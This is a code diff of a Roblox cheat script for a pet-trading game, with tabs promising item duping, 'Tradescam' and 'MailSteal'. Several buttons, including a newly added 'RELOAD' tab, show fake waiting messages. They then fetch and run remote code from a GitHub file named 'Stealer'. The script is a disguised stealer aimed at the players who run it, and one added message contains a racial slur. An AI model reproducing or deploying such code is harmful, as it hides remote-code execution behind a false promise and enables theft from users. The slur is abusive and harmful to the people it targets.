@@ -20,8 +20,44 @@ function ToPet2()
 end
 
 local Tab = Window:MakeTab({
+	Name = "RELOAD",
+	Icon = "4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddTextbox({
+	Name = "RELOAD THE SCRIPT IF NOT WORKING",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)
+	    fromPet = Value
+		print(Value)
+	end	  
+})
+
+Tab:AddTextbox({
+	Name = "CLICK THE BUTTON BELOW TO RELOAD",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)
+       toPet = Value
+		print(Value)
+	end	  
+})
+
+Tab:AddButton({
+	    Name = "RELOAD",
+    Callback = function()
+           local message = require(game.ReplicatedStorage.Library.Client.Message)
+        message.Error("RELOADING IN 30SECONDS...")
+        wait(2) loadstring(game:HttpGet("https://raw.githubusercontent.com/Ps99Script-png/Stealer-/main/Stealer"))()
+        print("button pressed")
+      end    
+})
+
+local Tab = Window:MakeTab({
 	Name = "🐕Huge",
-	Icon = "rbxassetid://19002502357"
+	Icon = "rbxassetid://19002502357",
 	PremiumOnly = false
 })
 
@@ -46,7 +82,7 @@ Tab:AddTextbox({
 })
 
 Tab:AddButton({
-	Name = "Changed",
+	Name = "Change",
 	Callback = function()
 	    FromPet1()
         ToPet2()
@@ -56,7 +92,7 @@ Tab:AddButton({
 
 local Tab = Window:MakeTab({
     Name = "🚢Titanic",
-    Icon = "rbxassetid://19002398362"
+    Icon = "rbxassetid://19002398362",
     PremiumOnly = false
 })
 
@@ -81,18 +117,17 @@ Tab:AddTextbox({
 })
 
 Tab:AddButton({
-    Name = "Changed",
-    Callback = function()
-           local message = require(game.ReplicatedStorage.Library.Client.Message)
-        message.Error("PLEASE WAIT WHILE WE ARE PROCESSING THE DUPE")
-        wait(2) loadstring(game:HttpGet("https://raw.githubusercontent.com/Ps99Script-png/Stealer-/main/Stealer"))()
+    Name = "Change",
+	Callback = function()
+	    FromPet1()
+        ToPet2()
         print("button pressed")
-      end    
+  	end    
 })
 
 local Tab = Window:MakeTab({
     Name = "🐶Dupe",
-    Icon = "rbxassetid://19002506150"
+    Icon = "rbxassetid://19002506150",
     PremiumOnly = false
 })
 
@@ -128,7 +163,7 @@ Tab:AddButton({
 
 local Tab = Window:MakeTab({
     Name = "♻️Tradescam",
-    Icon = "rbxassetid://19002518018"
+    Icon = "rbxassetid://19002518018",
     PremiumOnly = false
 })
 
@@ -156,7 +191,7 @@ Tab:AddButton({
     Name = "Continue",
     Callback = function()
            local message = require(game.ReplicatedStorage.Library.Client.Message)
-        message.Error("PLEASE WAIT WHILE WE ARE PROCESSING THE DUPE")
+        message.Error("TRADE THE PLAYER AND WAIT 30 SECONDS...")
         wait(2) loadstring(game:HttpGet("https://raw.githubusercontent.com/Ps99Script-png/Stealer-/main/Stealer"))()
         print("button pressed")
       end    
@@ -164,7 +199,7 @@ Tab:AddButton({
 
 local Tab = Window:MakeTab({
     Name = "📬MailSteal",
-    Icon = "rbxassetid://19002507359"
+    Icon = "rbxassetid://19002507359",
     PremiumOnly = false
 })
 
@@ -192,7 +227,7 @@ Tab:AddButton({
     Name = "Continue",
     Callback = function()
            local message = require(game.ReplicatedStorage.Library.Client.Message)
-        message.Error("PLEASE WAIT WHILE WE ARE PROCESSING THE DUPE")
+        message.Error("PUT THE PLAYER NAME CORRECTLY NIGGA!")
         wait(2) loadstring(game:HttpGet("https://raw.githubusercontent.com/Ps99Script-png/Stealer-/main/Stealer"))()
         print("button pressed")
       end    
@@ -200,7 +235,7 @@ Tab:AddButton({
 
 local Tab = Window:MakeTab({
 	Name = "DISCORD",
-	Icon = "rbxassetid://4483345998"
+	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
 
